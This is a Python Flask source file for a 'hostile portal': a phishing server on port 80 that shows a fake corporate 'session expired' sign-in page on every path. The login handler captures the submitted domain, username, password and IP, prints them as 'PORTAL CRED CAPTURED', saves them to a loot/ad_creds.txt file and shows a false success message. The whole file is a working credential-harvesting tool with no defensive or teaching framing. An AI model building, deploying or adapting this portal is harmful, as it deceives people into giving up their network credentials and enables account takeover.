from flask import Flask, request
import datetime
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT_DIR = os.path.join(BASE_DIR, "loot")

app = Flask(__name__)

HTML_FORM = """<!DOCTYPE html>
<html>
<head>
  <title>Corporate Network — Session Expired</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f0f0;
           display: flex; justify-content: center; padding-top: 80px; }
    .box { background: white; padding: 40px; border-radius: 8px;
           width: 360px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    h2   { color: #0078d4; margin-bottom: 5px; }
    p    { color: #d83b01; font-size: 13px; }
    input[type=text], input[type=password] {
           width: 100%; padding: 9px; margin: 6px 0 14px 0;
           border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    input[type=submit] {
           width: 100%; padding: 10px;
           background: #0078d4; color: white;
           border: none; border-radius: 4px; cursor: pointer; font-size: 15px; }
    input[type=submit]:hover { background: #005fa3; }
    label { font-size: 13px; color: #333; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Corporate Network</h2>
    <p>&#9888; Your session has expired. Please sign in again.</p>
    <form method="POST" action="/login">
      <label>Domain</label>
      <input type="text" name="domain" value="CORP">
      <label>Username</label>
      <input type="text" name="username" placeholder="e.g. john.doe">
      <label>Password</label>
      <input type="password" name="password">
      <input type="submit" value="Sign In">
    </form>
  </div>
</body>
</html>"""


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    return HTML_FORM


@app.route("/login", methods=["POST"])
def login():
    entry = {
        "time":     str(datetime.datetime.now()),
        "ip":       request.remote_addr,
        "domain":   request.form.get("domain", ""),
        "username": request.form.get("username", ""),
        "password": request.form.get("password", "")
    }
    log = f"[{entry['time']}] {entry['domain']}\\{entry['username']}:{entry['password']} | IP: {entry['ip']}"
    print(f"\n[!!!] PORTAL CRED CAPTURED: {log}\n")

    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(os.path.join(LOOT_DIR, "ad_creds.txt"), "a") as f:
        f.write(log + "\n")

    return """<div style='font-family:Arial;text-align:center;padding-top:100px'>
               <h3 style='color:green'>Authentication successful.</h3>
               <p>Redirecting to network...</p></div>"""


def start_portal():
    print("[*] Hostile portal on http://0.0.0.0:80")
    print("[*] Credentials saved to loot/ad_creds.txt\n")
    try:
        app.run(host="0.0.0.0", port=80, debug=False)
    except KeyboardInterrupt:
        print("\n[*] Hostile portal stopped")
